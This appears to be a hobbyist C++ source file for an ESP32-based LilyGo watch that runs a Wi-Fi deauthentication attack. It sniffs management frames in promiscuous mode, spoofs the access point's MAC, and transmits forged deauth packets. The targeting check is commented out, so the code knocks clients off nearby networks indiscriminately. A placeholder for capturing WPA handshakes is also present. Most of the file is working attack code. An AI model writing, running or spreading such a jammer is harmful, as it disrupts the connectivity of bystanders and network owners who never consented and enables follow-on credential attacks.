#include <LilyGoLib.h>
#include <overlay.hpp>
#include <esp_wifi.h>

//typedef void (*func_ptr)(void* buff, wifi_promiscuous_pkt_type_t type);

bool * deautherUsedP;
bool * deautherActiveP;
bool * deautherScorchedEarthP;


typedef struct {
  unsigned frame_ctrl_version:2;
  unsigned frame_ctrl_type:6; //first 4 are subtype last 2 are type
  unsigned frame_ctrl_extra:8;
  unsigned duration_id:16;
  char addr1[6]; /* receiver address */
  char addr2[6]; /* 4sender address */
  char addr3[6]; /* filtering address */
  unsigned sequence_ctrl:16;
  char addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;


typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;


int min(int8_t one, int8_t two) {
    if (one < two) {
        return one;
    } else {
        return two;
    }
}


bool wifiDeauth(const char client[6], const char station[6]) {

    uint8_t stationLocal[6] = {station[0], station[1], station[2], station[3], station[4], station[5]};
    char clientLocal[] = {client[0], client[1], client[2], client[3], client[4], client[5]}; 

    char deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ client[0], client[1], client[2], client[3], client[4], client[5], // reciever (target)
    /* 10 - 15 */ stationLocal[0], stationLocal[1],stationLocal[2], stationLocal[3], stationLocal[4], stationLocal[5], // source (ap)
    /* 16 - 21 */ stationLocal[0], stationLocal[1],stationLocal[2], stationLocal[3], stationLocal[4], stationLocal[5], // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();

    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_set_mac(WIFI_IF_STA, stationLocal);
    esp_wifi_start();

    esp_wifi_80211_tx(WIFI_IF_STA,deauthPacket,26,true); 

    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);

    return true;
}


bool beacon_handeling(const wifi_ieee80211_mac_hdr_t *hdr, char deauthMac[6]) {
    if (hdr->frame_ctrl_type != 0b100000 && hdr->frame_ctrl_type != 0b010000) {

        printf("PacketReceived\n");
        printf("%02x\n", hdr->frame_ctrl_type);

        printf(
        " ADDR1=%02x:%02x:%02x:%02x:%02x:%02x,"
        " ADDR2=%02x:%02x:%02x:%02x:%02x:%02x,"
        " ADDR3=%02x:%02x:%02x:%02x:%02x:%02x\n",
    /* ADDR1 */
        hdr->addr1[0],hdr->addr1[1],hdr->addr1[2],
        hdr->addr1[3],hdr->addr1[4],hdr->addr1[5],
    /* ADDR2 */
        hdr->addr2[0],hdr->addr2[1],hdr->addr2[2],
        hdr->addr2[3],hdr->addr2[4],hdr->addr2[5],
    /* ADDR3 */
        hdr->addr3[0],hdr->addr3[1],hdr->addr3[2],
        hdr->addr3[3],hdr->addr3[4],hdr->addr3[5]
        );

        // this is a lamda function to check if the to be deauthed mac adress matches with 
        // either mac adresses it isn't perfect and can be falsely positive but honestly
        // I couldn't be bothered with making a more unreadable function
        // and the odds of false positives is stupid low so fuck it we ball 

        //if (*deautherActiveP == true && ( 
        //    [hdr, deauthMac]{
        //        for (int i = 0; i < 6; i++){
        //            if (hdr->addr1[i] != deauthMac[i] && hdr->addr2[i] != deauthMac[i]){
        //                return false;
        //            }
        //        }
        //        return true;
        //    }() == true || *deautherScorchedEarthP == true))
        //{
            return wifiDeauth(
                [hdr]{
                    if (hdr->addr1[0] != hdr->addr3[0]){
                        return hdr->addr1;
                    }
                    return hdr->addr1;
                    }(),
                hdr->addr3);
        //}
        //return true;
    }
    return false;
}


void handshakeGrabber(const char ap[6], const char client[6]) {

}


void wifi_packet_handler(void* buff, wifi_promiscuous_pkt_type_t type)
{
    if (type == WIFI_PKT_MGMT) {
        const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
        const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)ppkt->payload;

        const wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

        char deauthMac[6] = {0,0,0,0,0,0};

        //*deautherUsedP = 
        beacon_handeling(hdr, deauthMac);

        return;

    } else if (type == WIFI_PKT_CTRL) {

    } else if (type == WIFI_PKT_DATA) {

    } else if (type == WIFI_PKT_MISC) {

    }
}

void IRAM_ATTR channelSwitch()
{
    uint8_t channel;
    wifi_second_chan_t channel2;
    esp_wifi_get_channel(&channel, &channel2);
    esp_wifi_set_channel(((channel + 1) % 13) + 1, WIFI_SECOND_CHAN_NONE);
}

void wifiApp(){
    int16_t x, y;

    wifi_country_t wifi_country = {.cc="DE", .schan = 1, .nchan = 13};

    bool deautherUsed = false;
    bool deautherActive = true;
    bool deautherScorchedEarth = true;

    deautherUsedP = &deautherUsed; 
    deautherActiveP = &deautherActive;
    deautherScorchedEarthP = &deautherScorchedEarth;

    char text [2][20];
    char aps [20][6];
    char clients [20][6];
    
    watch.fillScreen(TFT_BLACK);
    watch.setRotation(2);
    watch.setTextSize(2);
    watch.setTextColor(TFT_PURPLE);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    esp_wifi_init(&cfg);
    esp_wifi_set_country(&wifi_country);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_packet_handler);

    //hw_timer_t * channelSwitchTimer = timerBegin(0, 80, true);

    //timerAttachInterrupt(channelSwitchTimer, &channelSwitch, true);
    //timerAlarmWrite(channelSwitchTimer, 1000, true);
    //timerAlarmEnable(channelSwitchTimer);

    overlay_display();

    while (true) {
        if (watch.getPoint(&x, &y)) {
            if (overlay_detect(x, y)) {
                //timerAlarmDisable(channelSwitchTimer);
                //timerEnd(channelSwitchTimer);
                esp_wifi_stop();
                esp_wifi_deinit();
                deautherUsedP = nullptr;
                deautherActiveP = nullptr;
                deautherScorchedEarthP = nullptr;
                return;
            }
        }
        //if (deautherUsed == true){
        //    deautherUsed = false;
        //}
    }
}